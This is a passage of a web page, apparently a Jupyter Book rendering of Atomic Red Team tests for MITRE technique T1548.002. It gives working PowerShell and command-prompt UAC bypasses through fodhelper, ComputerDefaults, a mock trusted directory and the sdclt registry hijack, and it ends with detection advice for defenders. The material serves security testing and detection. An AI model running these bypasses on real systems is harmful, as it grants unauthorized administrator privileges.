</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-4-bypass-uac-using-fodhelper-powershell">
<h3>Atomic Test #4 - Bypass UAC using Fodhelper - PowerShell<a class="headerlink" href="#atomic-test-4-bypass-uac-using-fodhelper-powershell" title="Permalink to this headline">¶</a></h3>
<p>PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution command prompt will be opened.</p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="id2">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Force</span>
<span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DelegateExecute&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;&quot;</span> <span class="n">-Force</span>
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="n">-Force</span>
<span class="nb">Start-Process</span> <span class="s2">&quot;C:\Windows\System32\fodhelper.exe&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1548</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-5-bypass-uac-using-computerdefaults-powershell">
<h3>Atomic Test #5 - Bypass UAC using ComputerDefaults (PowerShell)<a class="headerlink" href="#atomic-test-5-bypass-uac-using-computerdefaults-powershell" title="Permalink to this headline">¶</a></h3>
<p>PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
Upon execution administrative command prompt should open</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="id3">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Force</span>
<span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DelegateExecute&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;&quot;</span> <span class="n">-Force</span>
<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="n">-Force</span>
<span class="nb">Start-Process</span> <span class="s2">&quot;C:\Windows\System32\ComputerDefaults.exe&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1548</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">5</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-6-bypass-uac-by-mocking-trusted-directories">
<h3>Atomic Test #6 - Bypass UAC by Mocking Trusted Directories<a class="headerlink" href="#atomic-test-6-bypass-uac-by-mocking-trusted-directories" title="Permalink to this headline">¶</a></h3>
<p>Creates a fake “trusted directory” and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="id4">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>mkdir &quot;\\?\C:\Windows \System32\&quot;
copy &quot;C:\Windows\System32\cmd.exe&quot; &quot;\\?\C:\Windows \System32\mmc.exe&quot;
mklink c:\testbypass.exe &quot;\\?\C:\Windows \System32\mmc.exe&quot;
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1548</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-7-bypass-uac-using-sdclt-delegateexecute">
<h3>Atomic Test #7 - Bypass UAC using sdclt DelegateExecute<a class="headerlink" href="#atomic-test-7-bypass-uac-using-sdclt-delegateexecute" title="Permalink to this headline">¶</a></h3>
<p>Bypasses User Account Control using a fileless method, registry only.
Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
<a class="reference external" href="http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass">Reference - sevagas.com</a>
Adapted from <a class="reference external" href="https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1">MITRE ATT&amp;CK Evals</a></p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="id5">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Force</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Classes\Folder\shell\open\command&quot;</span> <span class="n">-Value</span> <span class="s1">&#39;cmd.exe /c notepad.exe&#39;</span>
<span class="nb">New-ItemProperty</span> <span class="n">-Force</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Classes\Folder\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DelegateExecute&quot;</span>
<span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="nv">$env:windir</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">sdclt</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Start-Sleep</span> <span class="n">-s</span> <span class="n">3</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1548</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">7</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="detection">
<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
<p>There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of <a class="reference external" href="https://attack.mitre.org/techniques/T1055">Process Injection</a> and unusual loaded DLLs through <a class="reference external" href="https://attack.mitre.org/techniques/T1574/001">DLL Search Order Hijacking</a>, which indicate attempts to gain access to higher privileged processes.</p>
<p>Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:</p>
<ul class="simple">
<li><p>The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)</p></li>
<li><p>The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)</p></li>
</ul>
<p>Analysts should monitor these Registry settings for unauthorized changes.</p>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: ".net-powershell"
        },
        kernelOptions: {
            kernelName: ".net-powershell",
            path: "./tactics/privilege-escalation"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = '.net-powershell'</script>

              </div>
              
        </div>
    </div>
    
    
    <div class='prev-next-bottom'>
        
    <a class='left-prev' id="prev-link" href="../privilege-escalation.html" title="previous page">Privilege Escalation</a>
    <a class='right-next' id="next-link" href="T1546.008.html" title="next page">T1546.008 - Event Triggered Execution: Accessibility Features</a>

    </div>
    <footer class="footer mt-5 mt-md-0">
    <div class="container">
      <p>
        
          By Hare Sudhan Muthusamy<br/>
        
            &copy; Copyright 2020.<br/>
      </p>
    </div>
  </footer>
</main>


      </div>
    </div>

    <script src="../../_static/js/index.js"></script>
    
  </body>
</html>